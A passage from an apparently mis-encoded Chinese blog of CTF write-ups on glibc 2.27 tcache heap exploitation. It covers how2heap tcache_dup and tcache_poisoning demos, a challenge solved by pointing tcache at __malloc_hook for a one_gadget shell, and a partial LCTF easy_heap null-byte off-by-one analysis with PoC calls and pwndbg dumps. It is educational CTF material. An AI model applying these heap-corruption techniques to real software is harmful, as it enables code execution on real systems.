·æˆ‘ä»¬æ‰€æœ‰çš„å‰ç½®å·¥ä½œå°±åšå¥½äº†ï¼Œæ¥ç€å°±æ˜¯é€šè¿‡tcache_dupå’Œtcache_poisoningæ¥getshelläº† é¦–å…ˆæˆ‘ä»¬å…ˆé€šè¿‡how2heapäº†è§£ä¸‹ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; //tcache_dup int main() { fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\\n&quot;); fprintf(stderr, &quot;Allocating buffer.\\n&quot;); int *a = malloc(8); fprintf(stderr, &quot;malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;Freeing twice...\\n&quot;); free(a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p ].\\n&quot;, a, a); fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\\n&quot;, malloc(8), malloc(8)); return 0; } #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; // tcache poisoning int main() { &quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into&quot; &quot;returning a pointer to an arbitrary location (in this case, the stack).&quot; &quot;The attack is very similar to fastbin corruption attack.&quot; size_t stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, (char *)&amp;stack_var); &quot;Allocating 1 buffer.&quot; intptr_t *a = malloc(128); fprintf(stderr, &quot;malloc(128): %p\\n&quot;, a); &quot;Freeing the buffer...&quot; free(a); fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n&quot; &quot;to point to the location to control (%p).\\n&quot;, sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, &quot;1st malloc(128): %p\\n&quot;, malloc(128)); fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, &quot;2nd malloc(128): %p\\n&quot;, b); &quot;We got the control&quot; return 0; } æˆ‘ä»¬å¯ä»¥å¾ˆæ˜æ˜¾çš„æ„Ÿå—åˆ°tcache_dupå°±æ˜¯å¼±åŒ–ç‰ˆçš„fastbin_double_freeï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æºç ç›¸å…³çš„å‡½æ•° tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); } è¿™å°±æ˜¯æˆ‘ä¹‹å‰æ‰€è¯´è¿‡å¼•å…¥tcacheæœºåˆ¶é™ä½äº†å®‰å…¨æ€§çš„ä¸€ä¸ªä½“ç°ï¼Œæœ¬æ¥åº”è¯¥è¦æœ‰tcache-&gt;counts[tc_idx] çš„ç›¸å…³æ£€éªŒï¼Œå´ä¸ºæå‡æ•ˆç‡è€Œå»æ‰äº†ï¼Œè¿™ä¹Ÿä¾§é¢çš„è¯´æ˜å®‰å…¨å’Œæ€§èƒ½å¤„åœ¨ä¸€ä¸ªæ­¤æ¶ˆå½¼é•¿çš„çŠ¶æ€ æˆ‘ä»¬ç®€å•çš„è°ƒè¯•ä¸‹tcache_dup pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55a661cd5270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x20) tcache_entry[0]: 0x55a661cd5260 --&gt; 0x55a661cd5260 (overlap chunk with 0x55a661cd5250(freed) ) æˆ‘ä»¬ç›´æ¥freeä¸¤æ¬¡åŒä¸€ä¸ªchunkï¼Œå°±èƒ½ç›´æ¥å¾—åˆ°ä¸¤ä¸ªæŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆï¼Œè¿™æ— ç–‘æ¯”æ­£å¸¸åœ¨fastbinä¸‹çš„double freeç®€æ˜“è®¸å¤š æ¥ç€æˆ‘ä»¬çœ‹ä¸‹tcache_poisoningï¼Œç®€å•æ¥è¯´tcache_poisoningå°±æ˜¯ä¸€ä¸ªé€šè¿‡è¦†ç›–tcache_nextå°±ç›´æ¥å¯ä»¥mallocåˆ°ä»»æ„åœ°å€å»å°†å…¶è¦†ç›–ä¸ºone_gadgetæˆ–æ˜¯åˆ«çš„ä¸œè¥¿å»è¿›è¡Œåˆ©ç”¨çš„ä¸€ä¸ªå¾ˆä¸‡é‡‘æ²¹çš„ç”¨æ³•ï¼Œæˆ‘ä»¬è°ƒè¯•ä¸‹how2heapç»™çš„ç¨‹åº pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55a464be82e0 (size : 0x20d20) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x90) tcache_entry[7]: 0x55a464be8260 å®ƒå…ˆå¾€tcacheé‡Œé¢æ”¾äº†ä¸€ä¸ª0x80çš„chunkï¼Œç„¶åæˆ‘ä»¬å†çœ‹ä¸‹ä¿®æ”¹äº†tcache_nextåçš„tcache_entryæ˜¯æ€ä¹ˆæ ·çš„ â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 20 fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, a); 21 fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\\n&quot; 22 &quot;to point to the location to control (%p).\\n&quot;, sizeof(intptr_t), a, &amp;stack_var); 23 a[0] = (intptr_t)&amp;stack_var; 24 â–º 25 fprintf(stderr, &quot;1st malloc(128): %p\\n&quot;, malloc(128)); 26 fprintf(stderr, &quot;Now the tcache list has [ %p ].\\n&quot;, &amp;stack_var); 27 28 intptr_t *b = malloc(128); 29 fprintf(stderr, &quot;2nd malloc(128): %p\\n&quot;, b); 30 fprintf(stderr, &quot;We got the control\\n&quot;); â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 00:0000â”‚ rdx rsp 0x7ffe99bc1bb0 â€”â–¸ 0x55a4635689a0 (__libc_csu_init) â—‚â€” push r15 01:0008â”‚ 0x7ffe99bc1bb8 â€”â–¸ 0x55a464be8260 â€”â–¸ 0x7ffe99bc1bb0 â€”â–¸ 0x55a4635689a0 (__libc_csu_init) â—‚â€” push r15 02:0010â”‚ 0x7ffe99bc1bc0 â€”â–¸ 0x7ffe99bc1cb0 â—‚â€” 0x1 03:0018â”‚ 0x7ffe99bc1bc8 â—‚â€” 0xad94ca33a5db2a00 04:0020â”‚ rbp 0x7ffe99bc1bd0 â€”â–¸ 0x55a4635689a0 (__libc_csu_init) â—‚â€” push r15 05:0028â”‚ 0x7ffe99bc1bd8 â€”â–¸ 0x7f6dd0a631c1 (__libc_start_main+241) â—‚â€” mov edi, eax 06:0030â”‚ 0x7ffe99bc1be0 â—‚â€” 0x40000 07:0038â”‚ 0x7ffe99bc1be8 â€”â–¸ 0x7ffe99bc1cb8 â€”â–¸ 0x7ffe99bc2912 â—‚â€” 0x74632f656d6f682f (&#39;/home/ct&#39;) pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x55a464be82e0 (size : 0x20d20) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x90) tcache_entry[7]: 0x55a464be8260 --&gt; 0x7ffe99bc1bb0 --&gt; 0x55a4635689a0 æˆ‘ä»¬å¯ä»¥çœ‹è§è®¾ç½®çš„æ ˆåœ°å€æ”¾åœ¨äº†tcache_entryçš„ç¬¬äºŒä¸ªå †ï¼Œè¿™æ—¶æˆ‘ä»¬åªè¦newä¸¤ä¸ª0x80å¤§å°çš„chunkå°±å¯ä»¥æ§åˆ¶tcache_nextæ‰€åœ¨çš„ç©ºé—´ æˆ‘ä»¬æ‹¿ä¸ªä¾‹é¢˜æ¥çœ‹çœ‹ï¼Œè¿™æ˜¯å±±ä¸œçœç§‘æ¥æ¯çš„ä¸€é“ç®€å•pwné¢˜ï¼Œç”±äºä»–ç»™çš„libcå°±å«libc-2.27æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨ubuntu18.04çš„ç¯å¢ƒå»è°ƒè¯•ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆçœ‹ä¸‹é¢˜ç›®çš„åŸºæœ¬ä¿¡æ¯ âœ bbtcache file bb_tcache bb_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=642e76244eb176cccd3e281014f18a7ea7551682, stripped âœ bbtcache checksec bb_tcache [*] &#39;/home/Ep3ius/pwn/process/bbtcache/bb_tcache&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled æˆ‘ä»¬æ¥ç€åç¼–è¯‘åˆ†æä¸€ä¸‹é¢˜ç›® void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { unsigned int i; // [rsp+Ch] [rbp-14h] int choice; // [rsp+10h] [rbp-10h] void *chunk; // [rsp+18h] [rbp-8h] setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); i = 0; puts(&quot;Welcome to easy heap game!&quot;); printf(&quot;I think you might need this: 0x%016llx\\n&quot;, &amp;system); while ( i != 7 ) { menu(++i); choice = fgets_input(); if ( choice == 2 ) // free { free(chunk); } else if ( choice == 3 ) // write { puts(&quot;You might need this to tamper something.&quot;); read(0, chunk, 8uLL); } else { if ( choice != 1 ) // new exit(0); chunk = malloc(0x10uLL); } } puts(&quot;Game over!&quot;); exit(0); } ç¨‹åºé€»è¾‘ååˆ†æ¸…æ™°ï¼Œä¸€å…±ä¸ƒæ¬¡æœºä¼šè¿›è¡Œnewã€freeã€writeçš„æ“ä½œæ¥getshellï¼Œç”±äºé™¤äº†æ¬¡æ•°æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¾ˆç›´æ¥çš„ä½“ä¼šåˆ°tcacheæœºåˆ¶æ‰€å¸¦æ¥çš„å®‰å…¨æ–¹é¢é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆåšä¸ªæ ‡å‡†çš„tcache_poisoningèµ·æ‰‹å¼ï¼Œå…ˆæ”¾ä¸€ä¸ªå †å—åˆ°tcache_entry pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556b70596270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x20) tcache_entry[0]: 0x556b70596260 æ¥ç€æˆ‘ä»¬é€šè¿‡writeæ“ä½œå»ä¿®æ”¹ä¸€ä¸‹tcache_nextä¸º&amp;malloc_hook pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556b70596270 (size : 0x20d90) last_remainder: 0x0 (size : 0x0) unsortbin: 0x0 (0x20) tcache_entry[0]: 0x556b70596260 --&gt; 0x7f2d9da10c10 (&amp;__malloc_hook) æ¥ç€newä¸¤æ¬¡æŠŠtcacheä»å–å‡ºå¹¶æŠŠmalloc_hookä¿®æ”¹æˆone_gadgetånewä¸€ä¸ªæ–°chunkè§¦å‘malloc_hookå°±å¯ä»¥getshelläº†ï¼Œå¾ˆç®€å•åˆç›´æ¥çš„é¢˜ç›®å§ã€‚ æˆ‘ä»¬å›åˆ°children_tcacheï¼Œå…ˆåšä¸ªtcache_dupï¼Œä¹Ÿå°±æ˜¯å¯¹æˆ‘ä»¬ä¹‹å‰æ’åœ¨ä¸¤ä¸ªunsort_binä¸­é—´çš„chunkè¿›è¡Œä¸¤æ¬¡free pwndbg&gt; parseheap addr prev size status fd bk 0x564f27df9000 0x0 0x250 Used None None 0x564f27df9250 0x0 0x510 Used None None 0x564f27df9760 0x510 0x30 Used None None 0x564f27df9790 0xdadadadadadadada 0x4f0 Freed 0x7fa26b599c78 0x7fa26b599c78 0x564f27df9c80 0x4f0 0x20 Used None None pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556e12172ca0 (size : 0x20360) last_remainder: 0x556e12172790 (size : 0x4f0) unsortbin: 0x556e12172790 (size : 0x4f0) (0x30) tcache_entry[1]: 0x556e12172770 pwndbg&gt; æ¥ç€æˆ‘ä»¬åªè¦free(2)å°±ç›¸å½“äºè·å¾—äº†ä¸¤ä¸ªæŒ‡å‘0x556e12172770çš„æŒ‡é’ˆ pwndbg&gt; heapinfo (0x20) fastbin[0]: 0x0 (0x30) fastbin[1]: 0x0 (0x40) fastbin[2]: 0x0 (0x50) fastbin[3]: 0x0 (0x60) fastbin[4]: 0x0 (0x70) fastbin[5]: 0x0 (0x80) fastbin[6]: 0x0 (0x90) fastbin[7]: 0x0 (0xa0) fastbin[8]: 0x0 (0xb0) fastbin[9]: 0x0 top: 0x556e12172ca0 (size : 0x20360) last_remainder: 0x556e12172790 (size : 0x4f0) unsortbin: 0x556e12172790 (size : 0x4f0) (0x30) tcache_entry[1]: 0x556e12172770 --&gt; 0x556e12172770 (overlap chunk with 0x556e12172760(freed) ) æ¥ç€æˆ‘ä»¬å°±å¯ä»¥newä¸€ä¸ªæ–°tcacheé‡Œé¢å­˜æ”¾malloc_hookç„¶åé€šè¿‡tcache_poisoningå°±å¯ä»¥æŠŠmalloc_hookä¿®æ”¹ä¸ºone_gadgetï¼Œå†newä¸€ä¸ªæ–°chunkå°±å¯ä»¥getshelläº†ã€‚ åœ¨ä¸æ–­çš„æŒ–æ˜tcacheæœºåˆ¶å°±ä¼šé‡åˆ°æ›´å¤šæ›´æœ‰æ„æ€çš„ä¸œè¥¿ï¼Œè™½ç„¶é™ä½å®‰å…¨æ€§ä½†ä¹Ÿå˜å¾—æ›´åŠ æœ‰è¶£äº†(æ»‘ç¨½) æ„Ÿè°¢M4xå¸ˆå‚…ï¼Œkirinå¸ˆå‚…ï¼ŒHpasserbyå¸ˆå‚…çš„çŸ¥è¯†åˆ†äº« ç›¸å…³é“¾æ¥ è°ƒè¯•ç¯å¢ƒ : nepire-pwn (å°†~/nepire-pwn/DOCKER/Dockerfileç¬¬ä¸€è¡Œçš„16.04 æ¢æˆ17.10æˆ–æ›´é«˜å³å¯è°ƒè¯•tcache) è°ƒè¯•å™¨ï¼šPWNDBG","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"LCTFâ€”easypwnè¯¦è§£","slug":"LCTFâ€”easypwnè¯¦è§£","date":"2019-11-05T04:03:15.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2019/11/05/LCTFâ€”easypwnè¯¦è§£/","link":"","permalink":"/2019/11/05/LCTFâ€”easypwnè¯¦è§£/","excerpt":"","text":"å¬è¯´ä¸€è¡€æœ‰pwnhubæ³¨å†Œç æ‹¿å°±å»è¯•ç€æ‰“äº†ä¸€ä¸‹å‘¨æœ«çš„è¿™åœºLCTFï¼Œç»“æœä½œä¸ºç­¾åˆ°é¢˜é€‰æ‰‹(ç¬‘)è¿ç­¾åˆ°é¢˜çš„ä¸€è¡€éƒ½æ‹¿ä¸åˆ°å¯èƒ½è¿™å°±æ˜¯å‘½å§ï¼Œä¸è¿‡é‡åˆ°äº†ä¸€é¢˜ä¸é”™çš„pwnï¼Œå°±è¯¦ç»†çš„è®°å½•ä¸‹è§£é¢˜æ€è·¯å’ŒæŠ€å·§å§ æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢â€”LCTF2018-easypwn-è¯¦ç»†è§£æ easy pwnå…ˆçœ‹ä¸‹ç»™çš„æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ âœ easy_heap file easy_heap easy_heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a94f7ec039023e90d619f61acca68dd0863486c4, stripped âœ easy_heap checksec easy_heap [*] &#39;/home/Ep3ius/pwn/process/easy_heap/easy_heap&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64ä½ç¨‹åºé˜²æŠ¤åŸºæœ¬å…¨å¼€ï¼Œæ¥ç€æˆ‘ä»¬idaçœ‹ä¸‹ç¨‹åºåç¼–è¯‘çš„ç»“æœ void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int choice; // eax init_0(); chunk_menu = calloc(0xA0uLL, 1uLL); if ( !chunk_menu ) { puts(&quot;init error!&quot;); exit_(); } while ( 1 ) { while ( 1 ) { menu(); choice = read_input(); if ( choice != 2 ) break; delete(); } if ( choice &gt; 2 ) { if ( choice == 3 ) { show(); } else if ( choice == 4 ) { exit_(); } } else if ( choice == 1 ) { new(); } } } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªåŸºç¡€çš„èœå•å‹ç¨‹åºï¼Œè¿™é‡Œæ¯”è¾ƒåœ¨æ„çš„æ˜¯ç¨‹åºå…ˆcallocäº†ä¸€ä¸ª0xa0å¤§å°çš„å †å—ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸‹mallocå’Œ callocçš„åŒºåˆ«ä¸»è¦åœ¨äºcallocåœ¨åŠ¨æ€åˆ†é…å®Œå†…å­˜åï¼Œè‡ªåŠ¨åˆå§‹åŒ–è¯¥å†…å­˜ç©ºé—´ä¸ºé›¶ï¼Œè€Œmallocä¸åˆå§‹åŒ–ï¼Œé‡Œè¾¹æ•°æ®æ˜¯éšæœºçš„åƒåœ¾æ•°æ®ã€‚ void new() { __int64 v0; // rbx __int64 idx; // [rsp+0h] [rbp-20h] int idxa; // [rsp+0h] [rbp-20h] unsigned int chunk_size; // [rsp+4h] [rbp-1Ch] unsigned __int64 v4; // [rsp+8h] [rbp-18h] v4 = __readfsqword(0x28u); LODWORD(idx) = 0; while ( idx &lt;= 9 &amp;&amp; *(16LL * idx + chunk_menu) ) LODWORD(idx) = idx + 1; if ( idx == 10 ) { puts(&quot;full!&quot;); } else { v0 = chunk_menu; *(v0 + 16LL * idx) = malloc(0xF8uLL); if ( !*(16LL * idx + chunk_menu) ) { puts(&quot;malloc error!&quot;); exit_(); } printf(&quot;size \\n&gt; &quot;, idx, v4); chunk_size = read_input(); if ( chunk_size &gt; 0xF8 ) exit_(); *(16LL * idxa + chunk_menu + 8) = chunk_size; printf(&quot;content \\n&gt; &quot;); read_input_content(*(16LL * idxa + chunk_menu), *(16LL * idxa + chunk_menu + 8)); } } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯ä»¥newçš„chunkçš„æ•°é‡æ˜¯æœ€å¤šæ—¶10ä¸ªï¼Œå¹¶ä¸”mallocçš„æ–°chunkä½ç½®éƒ½æ˜¯åœ¨å¼€å¤´callocçš„chunkåé¢ï¼Œå¹¶ä¸”contentçš„è¾“å…¥æ–¹å¼å•ç‹¬å†™äº†ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹çœ‹ void __fastcall read_input_content(_BYTE *input, int chunk_size) { unsigned int i; // [rsp+14h] [rbp-Ch] i = 0; if ( chunk_size ) { while ( 1 ) { read(0, &amp;input[i], 1uLL); if ( chunk_size - 1 &lt; i || !input[i] || input[i] == &#39;\\n&#39; ) break; ++i; } input[i] = 0; input[chunk_size] = 0; #null byte off-by-one } else { *input = 0; } } æˆ‘ä»¬ç»“åˆå‰é¢çš„SIZE_MAX = 0xF8å’Œmallocçš„éƒ½æ˜¯0xF8å¯ä»¥å‘ç°ï¼Œå½“æˆ‘ä»¬newä¸€ä¸ªsize=0xF8çš„chunkæ—¶ä»–ä¼šæŠŠinput[0xf8]èµ‹å€¼ä¸º0ï¼Œä½†è¿™å°±ç›¸å½“äºæŠŠä¸‹ä¸€ä¸ªchunkçš„sizeä½è¦†ç›–äº†ä¸€ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å…·ä½“è°ƒè¯•ä¸€ä¸‹ #poc new(0x10,&#39;aaaa&#39;) #0 new(0x10,&#39;aaaa&#39;) #1 free(0) new(0xf8,&#39;a&#39;*0xf8) #0 pwndbg&gt; parseheap addr prev size status fd bk 0x558c833fa000 0x0 0x250 Used None None 0x558c833fa250 0x0 0xb0 Used None None 0x558c833fa300 0x0 0x100 Used None None 0x558c833fa400 0x0 0x100 Used None None pwndbg&gt; x/8x 0x558c833fa400 0x558c833fa400: 0x0000000000000000 0x0000000000000101 0x558c833fa410: 0x0000000062626262 0x0000000000000000 0x558c833fa420: 0x0000000000000000 0x0000000000000000 0x558c833fa430: 0x0000000000000000 0x0000000000000000 # new(0xf8,&#39;a&#39;*0xf8) pwndbg&gt; parseheap addr prev size status fd bk 0x558c833fa000 0x0 0x250 Used None None 0x558c833fa250 0x0 0xb0 Used None None 0x558c833fa300 0x0 0x100 Freed 0x61616161616161610x6161616161616161 0x558c833fa400 0x6161616161616161 0x100 Used None None pwndbg&gt; x/8x 0x558c833fa400 0x558c833fa400: 0x6161616161616161 0x0000000000000100 &lt;== null byte overwrite 0x558c833fa410: 0x0000000062626262 0x0000000000000000 0x558c833fa420: 0x0000000000000000 0x0000000000000000 0x558c833fa430: 0x0000000000000000 0x0000000000000000 pwndbg&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°chunk1çš„sizeä½ç¡®å®è¢«\\x00æ‰€è¦†ç›–äº†ï¼Œä¹Ÿè¯æ˜ç¡®å®åªè¦size=0xf8å°±å¯ä»¥overwriteä¸€å­—èŠ‚åˆ°ä¸‹ä¸€ä¸ªchunkçš„sizeä½ æ¥ç€æˆ‘ä»¬çœ‹ä¸‹deleteå’Œshowå‡½æ•° void delete() { unsigned int idx; // [rsp+4h] [rbp-Ch] printf(&quot;index \\n&gt; &quot;); idx = read_input(); if ( idx &gt; 9 || !*(16LL * idx + chunk_menu) ) exit_(); memset(*(16LL * idx + chunk_menu), 0, *(16LL * idx + chunk_menu + 8)); free(*(16LL * idx + chunk_menu)); *(16LL * idx + chunk_menu + 8) = 0; *(16LL * idx + chunk_menu) = 0LL; } void show() { unsigned int idx; // [rsp+4h] [rbp-Ch] printf(&quot;index \\n&gt; &quot;); idx = read_input(); if ( idx &gt; 9 || !*(16LL * idx + chunk_menu) ) exit_(); puts(*(16LL * idx + chunk_menu)); } ä¸­è§„ä¸­çŸ©ï¼Œæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ åˆ†æå®Œäº†åœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œåæ¥åœ¨è°ƒé¢˜ç›®ç»™çš„libcæ—¶ç§‰æŒç€ççŒ«ä¸€èˆ¬æ˜¯èƒ½ç¢°åˆ°æ­»è€—å­çš„åŸåˆ™æŸ¥äº†ä¸‹libcçš„ç‰ˆæœ¬ï¼Œç»“æœè¿˜çœŸçš„æ‰¾åˆ°äº†æ˜¯2.27 è¦è€ƒè™‘tcacheï¼Œé©¬ä¸Šåˆ‡äº†ä¸ªç¯å¢ƒå»è°ƒè¯•(åœ¨è¿™ä¹‹å‰å¿«è¢«å„ç§double freeæŠ¥é”™ææ­»äº†ï¼Œå“­) æˆ‘ä»¬å…ˆå¸ƒå±€å¥½7ã€8ã€9å·å † new_tcache() new(0x10,&#39;aaaa&#39;) #7 new(0x10,&#39;bbbb&#39;) #8 new(0x10,&#39;cccc&#39;) #9 free_tcache() free(7) free(8) free(9) ç„¶åä¸‹é¢çš„æ“ä½œçœ‹ä¸Šå»å¯èƒ½ä¼šå¾ˆç»•ä½†æƒ³æ˜ç™½äº†å°±å¾ˆæ˜äº†äº†ï¼Œæˆ‘ä»¬å…ˆæŠŠ0-6ä»tcacheå–å‡ºnewå¥½7ã€8ã€9å·å †åå†æ”¾å›tcacheåæŠŠchunk7é‡Šæ”¾è¿™æ—¶æˆ‘ä»¬å†çœ‹ä¸‹chunk7çš„çŠ¶æ€ pwndbg&gt; parseheap addr prev size status fd bk 0x564965142000 0x0 0x250 Used None None 0x564965142250 0x0 0xb0 Used None None 0x564965142300 0x0 0x100 Used None None 0x564965142400 0x0 0x100 Used None None 0x564965142500 0x0 0x100 Used None None 0x564965142600 0x0 0x100 Used None None 0x564965142700 0x0 0x100 Used None None 0x564965142800 0x0 0x100 Used None None 0x564965142900 0x0 0x100 Used None None 0x564965142a00 0x0 0x100 Freed 0x7fa21366eca0 0x7fa21366eca0 0x564965142b00 0x100 0x100 Used None None 0x564965142c00 0x200 0x100 Used None None pwndbg&gt; x/8x 0x564965142a00 0x564965142a00: 0x0000000000000000 0x0000000000000101 0x564965142a10: 0x00007fa21366eca0 0x00007fa21366eca0 0x564965142a20: 0x0000000000000000 0x0000000000000000 0x564965142a30: 0x0000000000000000 0x0000000000000000 pwndbg&gt; å·²ç»æŠŠmain_arenaæ”¾å…¥åœ¨chunké‡Œäº†ï¼Œè¿™æ—¶æˆ‘ä»¬å†æŠŠtcacheæ¸…ç©ºåfree8å†é‡æ–°å–å›æ¥è®©chunk8_size=0xf8è§¦å‘null byte off-by-oneè¦†ç›–chunk9çš„previnuseä½ä¸º0ï¼Œè®©æˆ‘ä»¬çœ‹ä¸‹chunkç°åœ¨çš„æƒ…å†µ pwndbg&gt; parseheap addr prev size status fd bk 0x556bf9a1e000 0x0 0x250 Used None None 0x556bf9a1e250 0x0 0xb0 Used None None 0x556bf9a1e300 0x0 0x100 Used None None 0x556bf9a1e400 0x0 0x100 Used None None 0x556bf9a1e500 0x0 0x100 Used None None 0x556bf9a1e600 0x0 0x100 Used None None 0x556bf9a1e700 0x0 0x100 Used None None 0x556bf9a1e800 0x0 0x100 Used None None 0x556bf9a1e900 0x0 0x100 Used None None 0x556bf9a1ea00 0x0 0x100 Freed 0x7f003ff88ca0 0x7f003ff88ca0 0x556bf9a1eb00 0x100 0x100 Freed 0x746972777265766f 0x392065 0x556bf9a1ec00 0x200 0x100 Used None None pwndbg&gt; x/8x 0x556bf9a1ea00 0x556bf9a1ea00: 0x0000000000000000 0x0000000000000101 0x556bf9a1ea10: 0x00007f003ff88ca0 0x00007f003ff88ca0 0x556bf9a1ea20: 0x0000000000000000 0x0000000000000000 0x556bf9a1ea30: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/8x 0x556bf9a1eb00 0x556bf9a1eb00: 0x0000000000000100 0x0000000000000100 0x556bf9a1eb10: 0x746972777265766f 0x0000000000392065 0x556bf9a1eb20: 0x0000000000000000 0x0000000000000000 0x556bf9a1eb30: 0x0000000000000000 0x0000000000000000 pwndbg&gt; x/8x 0x556bf9a1ec00 0x556bf9a1ec00: 0x0000000000000200 0x0000000000000100 0x556bf9a1ec10: 0x0000000063636363 0x0000000000000000 